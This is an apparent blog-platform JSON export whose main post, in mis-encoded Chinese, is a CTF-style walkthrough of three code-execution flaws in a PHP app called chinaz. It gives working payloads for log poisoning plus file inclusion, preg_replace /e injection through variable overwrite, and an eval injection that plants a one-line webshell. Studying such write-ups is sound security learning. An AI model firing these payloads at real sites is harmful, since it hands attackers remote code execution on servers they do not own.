{"meta":{"title":"glotozz'blog","subtitle":null,"description":null,"author":"glotozz","url":"http://yoursite.com","root":"/"},"pages":[{"title":"æ„Ÿè°¢","date":"2019-07-18T11:37:42.000Z","updated":"2019-07-18T11:38:41.901Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":"è°¢è°¢æ”¯æŒæˆ‘çš„å°ä¼™ä¼´"}],"posts":[{"title":"chinazçš„ä»£ç æ‰§è¡Œå’Œå‘½ä»¤æ‰§è¡Œæ¼æ´","slug":"chinazçš„ä»£ç æ‰§è¡Œå’Œå‘½ä»¤æ‰§è¡Œæ¼æ´","date":"2019-08-13T04:57:44.000Z","updated":"2019-08-13T05:00:04.467Z","comments":true,"path":"2019/08/13/chinazçš„ä»£ç æ‰§è¡Œå’Œå‘½ä»¤æ‰§è¡Œæ¼æ´/","link":"","permalink":"http://yoursite.com/2019/08/13/chinazçš„ä»£ç æ‰§è¡Œå’Œå‘½ä»¤æ‰§è¡Œæ¼æ´/","excerpt":"","text":"1ã€index.php1234567891011121314&lt;?php require_once(&quot;library/common.php&quot;); require_once(&quot;library/view.php&quot;); $view_class = new View(); $data = array(); if (isset($_GET[&apos;page&apos;])) &#123; $data[&apos;page&apos;] = filter($_GET[&apos;page&apos;]); &#125; else&#123; $data[&apos;page&apos;] = &apos;js&apos;; &#125; $view_class-&gt;echoContent($data[&apos;page&apos;], $data);?&gt; indexé¡µé¢é€šè¿‡pageå‚æ•°è°ƒç”¨ä¸åŒåŠŸèƒ½çš„phpé¡µé¢ 2ã€action.php12345678910&lt;?php require_once(&quot;library/common.php&quot;); require_once(&quot;library/view.php&quot;); $page = filter($_POST[&apos;page&apos;]).&apos;.php&apos;; $post_data = array(); foreach ($_POST as $key =&gt; $value) &#123; $post_data[$key] = $value; &#125; @require_once($page);?&gt; å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯å­˜åœ¨åç¼€.phpï¼Œè¿‡æ»¤ä¸»è¦æ˜¯filterï¼Œ å…¨å±€æœç´¢ 12345&gt; function filter($input)&gt; &#123;&gt; return str_replace(&apos;.&apos;, &apos;&apos;, $input);&gt; &#125;&gt; å°† . è¿‡æ»¤æˆç©ºï¼Œæ–‡ä»¶åŒ…å«è·¯å¾„ä¸­ä¸èƒ½æœ‰ . å¯¼è‡´æ— æ³•ä½¿ç”¨ç›¸å¯¹è·¯å¾„ é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç»å¯¹è·¯å¾„è¿›è¡ŒåŒ…å«ã€‚ å¯ä»¥åŒ…å«å¸¸è§é‡è¦æ–‡ä»¶æˆ–æ—¥å¿—æ–‡ä»¶ 3ã€common.php12345function write_log($input)&#123; global $cfg_logfile; file_put_contents($cfg_logfile, $input, FILE_APPEND);&#125; 123456789101112function loadFile($filePath)&#123; global $cfg_basedir; if(!file_exists($filePath))&#123; write_log(&apos;Try to open Null file:&apos;.$filePath); return file_get_contents($cfg_basedir.&apos;/error.php&apos;); &#125; $fp = @fopen($filePath,&apos;r&apos;); $sourceString = @fread($fp,filesize($filePath)); @fclose($fp); return $sourceString;&#125; 1$cfg_logfile = dirname($_SERVER[&apos;SCRIPT_FILENAME&apos;]) . DS. &quot;logs/logfile.php&quot;; å½“è®¿é—®ä¸å­˜åœ¨çš„é¡µé¢æ—¶ï¼Œå†™å…¥å†…å®¹åˆ°logs/logfile.phpä¸­ 4ã€æ¼æ´ä¸€æ”»å‡»å¤ç°æ„é€ payloadï¼š http://59.110.164.44:8238/?page=%3Cphp%20phpinfo();?%3E è®¿é—®ï¼š http://59.110.164.44:8238/logs/logfile.php å¦‚æœæ²¡æœ‰ç›´æ¥è®¿é—®æƒé™ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨action.phpä¸­çš„æ–‡ä»¶åŒ…å«ï¼Œ å¹¶ä¸”å¯ä»¥çœ‹åˆ°phpinfoä¸­ï¼Œå› æ­¤æ— æ³•è¿œç¨‹æ–‡ä»¶åŒ…å« allow_url_fopen On On allow_url_include Off Off 5ã€normaliz.php12345678910try&#123; if ($method == &apos;/\\\\d+\\\\.\\\\d+\\\\.\\\\d+\\\\.\\\\d+/&apos;) &#123; $res = preg_replace($method, $ip_replacement, $source); &#125; else &#123; $res = preg_replace($method, $mail_replacement, $source); &#125; &#125; preg_replaceçš„æ­£åˆ™å¦‚æœåŠ äº†eè¿™ä¸ªé€‰é¡¹ï¼Œä¼šæŠŠæ­£åˆ™è¡¨è¾¾å¼æ›¿æ¢çš„éƒ¨åˆ†æ›¿æ¢ä¹‹åçš„å†…å®¹æ‰§è¡Œä¸€ä¸‹ï¼Œç„¶åå°†æ‰§è¡Œå®Œçš„ç»“æœæ”¾å…¥éœ€è¦è¢«æ›¿æ¢çš„ä½ç½® method=/a/e&amp;mail_replacement=phpinfo()&amp;source=a; preg_replace(â€œ/a/eâ€,â€phpinfo()â€,â€aâ€); ä½†æ˜¯php 7.0.0å¼€å§‹ï¼Œä¸å†æ”¯æŒ/eä¿®é¥°ç¬¦ï¼Œè¯·ç”¨preg_replace_callback()ä»£æ›¿ è€Œä¸”ä»å‰é¢çš„phpinfoå¾—çŸ¥æˆ‘ä»¬çš„PHPç‰ˆæœ¬æ˜¯7.3.4ğŸ¤¦â€ 6ã€å…ˆè§£å†³å˜é‡è¦†ç›–é—®é¢˜1234567$view_class = new View();$data = array();$data[&apos;page&apos;] = &apos;normaliz&apos;;$ip_replacement = &apos;222.222.222.222&apos;;$mail_replacement = &apos;lollol@lol.com&apos;;$data[&apos;res&apos;] = action($post_data, $ip_replacement, $mail_replacement);$view_class-&gt;echoContent($data[&apos;page&apos;], $data); é™¤äº†$post_dataï¼Œå…¶ä»–å€¼éƒ½æ˜¯å†™æ­»çš„ï¼Œå¦‚ä½•æ§åˆ¶ é€šè¿‡action.phpçš„æ–‡ä»¶åŒ…å«ï¼Œè¿›è¡Œå˜é‡è¦†ç›–æ§åˆ¶ 1234$post_data = array();foreach ($_POST as $key =&gt; $value) &#123; $post_data[$key] = $value;&#125; + normaliz.php 1234function action($post_data, $ip_replacement, $mail_replacement)&#123; foreach ($post_data as $key =&gt; $value) &#123; $$key = $value; &#125; 7ã€æ¼æ´äºŒæ”»å‡»å¤ç°åœ¨æœ¬åœ°å°†phpåˆ‡æ¢ä¸ºphp5.4æ„é€ payload: http://127.0.0.1/chinaz/ postï¼š page=normaliz&amp;method=/a/e&amp;mail_replacement=phpinfo()&amp;source=a 8ã€view.php1@eval(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifstatus=true;&#125;else&#123;\\$ifstatus=false;&#125;&quot;); å’Œå…¸å‹çš„æµ·æ´‹cmsæ¼æ´å·®ä¸å¤š 1234&lt;?php $strIf=&apos;&quot;&quot;or phpinfo() or&quot;&quot;==&quot;&quot;&apos;; var_dump(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifstatus=true;&#125;else&#123;\\$ifstatus=false;&#125;&quot;); var_dump(@eval(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifstatus=true;&#125;else&#123;\\$ifstatus=false;&#125;&quot;)); ç»“æœï¼š 1234567string(66) &quot;if(&quot;&quot;or phpinfo() or&quot;&quot;==&quot;&quot;)&#123;$ifstatus=true;&#125;else&#123;$ifstatus=false;&#125;&quot;phpinfo()PHP Version =&gt; 7.3.4System =&gt; Windows NT DESKTOP-58QQPVV 10.0 build 17134 (Windows 10) AMD64............ 9ã€å¯»æ‰¾æ”»å‡»ç‚¹123456789101112131415161718192021&lt;?php require_once(&quot;library/common.php&quot;); require_once(&quot;library/view.php&quot;); function action($post_data)&#123; foreach ($post_data as $key =&gt; $value) &#123; $$key = $value; &#125; if ($method===&apos;md5&apos;)&#123; $res = md5($source); &#125; if ($method===&apos;sha1&apos;)&#123; $res = sha1($source); &#125; return $res; &#125; $view_class = new View(); $data = array(); $data[&apos;page&apos;] = &apos;md5&apos;; $data[&apos;res&apos;] = action($post_data); $view_class-&gt;echoContent($data[&apos;page&apos;], $data);?&gt; md5æ–‡ä»¶åŒ…å«äº†view.phpï¼Œä¸”æœ‰å˜é‡è¦†ç›–ç‚¹ï¼Œreså¯æ§åˆ¶$strif è¯æ˜¯è¿™ä¹ˆè¯´ï¼Œä½†æ˜¯çœ‹äº†åŠå¤©ä¹Ÿçœ‹ä¸æ‡‚resæ˜¯æ€ä¹ˆæ§åˆ¶$strIfçš„ï¼Œå¤ªå¤šå¤„ç†å‡½æ•°ï¼Œæœ€è®¨åŒçš„ä¸€ç‚¹æ˜¯æˆ‘æ¯æ¬¡firefox+burp+phpstormè°ƒè¯•ä¸€ä¼šå°±ä¼šæ–­æ‰ã€‚ã€‚ã€‚ä¸çŸ¥é“ä¸ºå•¥ğŸ˜­ 10ã€æ¼æ´ä¸‰å¤ç°æ„é€ payloadï¼š http://127.0.0.1/chinaz/action.php postï¼špage=md5&amp;res=â€or @eval($_POST[adddd]) or â€œ&amp;adddd=phpinfo(); è¿™é‡Œçš„postçš„å€¼éœ€è¦bpæŠ“åŒ…ä¿®æ”¹ï¼Œå› ä¸ºhackbarç›´æ¥ä¼ å€¼resä¼šå˜æˆâ€â€ è·Ÿç€pdfé‡Œé¢çš„æµç¨‹èµ°äº†ä¸€éï¼Œé™¤äº†ç¬¬ä¸‰ä¸ªå…·ä½“ç»†èŠ‚ä¸æ˜¯å¾ˆæ‡‚ï¼Œç­‰ä¸‹æ¬¡å¤ç°æµ·æ´‹CMSçš„æ—¶å€™å†å›å¤´çœ‹çœ‹æŠŠï¼Œè¿˜æœ‰å¸Œæœ›æœ‰äººå¸®æˆ‘è§£å†³æˆ‘çš„è°ƒè¯•é—®é¢˜ã€‚","categories":[],"tags":[{"name":"-cms -å‘½ä»¤æ‰§è¡Œä¸ä»£ç æ‰§è¡Œ","slug":"cms-å‘½ä»¤æ‰§è¡Œä¸ä»£ç æ‰§è¡Œ","permalink":"http://yoursite.com/tags/cms-å‘½ä»¤æ‰§è¡Œä¸ä»£ç æ‰§è¡Œ/"}]},{"title":"Start","slug":"start","date":"2019-07-18T03:48:34.000Z","updated":"2019-07-18T11:16:12.822Z","comments":true,"path":"2019/07/18/start/","link":"","permalink":"http://yoursite.com/2019/07/18/start/","excerpt":"","text":"Skr è¿™æ¬¡å¤©buuctfåšåˆ°è‡ªé—­ï¼Œçœ‹æ¢ä¸ªåšå®¢èƒ½ä¸èƒ½æ¢ä¸ªå¿ƒæƒ…:)","categories":[],"tags":[{"name":"start","slug":"start","permalink":"http://yoursite.com/tags/start/"}]}]}